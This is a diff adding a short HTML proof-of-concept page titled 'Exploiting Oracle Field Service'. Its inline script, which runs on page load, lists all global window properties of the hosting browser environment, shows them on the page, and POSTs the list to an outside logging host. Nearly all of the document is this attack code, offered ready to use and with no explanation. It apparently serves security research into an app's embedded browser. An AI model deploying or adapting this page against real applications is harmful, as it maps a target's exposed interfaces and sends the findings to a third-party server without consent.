@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploitation</title>
+</head>
+<body>
+    <h1>Exploiting Oracle Field Service</h1>
+    <div id="output"></div>
+    <script>
+        (function () {
+            let output = document.getElementById('output');
+
+            // Función para enumerar propiedades globales de `window`
+            let keys = [];
+            for (let key in window) {
+                try {
+                    keys.push(`${key}: ${typeof window[key]}`);
+                } catch (e) {
+                    keys.push(`${key}: inaccessible`);
+                }
+            }
+
+            // Mostrar resultados en la página
+            let result = '<h3>Global Window Properties:</h3><ul>';
+            keys.forEach(key => {
+                result += `<li>${key}</li>`;
+            });
+            result += '</ul>';
+            output.innerHTML = result;
+
+            // Enviar resultados a tu servidor
+            fetch('https://lautarovculic.com/log', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ keys })
+            }).catch(err => console.error('Error sending data:', err));
+        })();
+    </script>
+</body>
+</html>
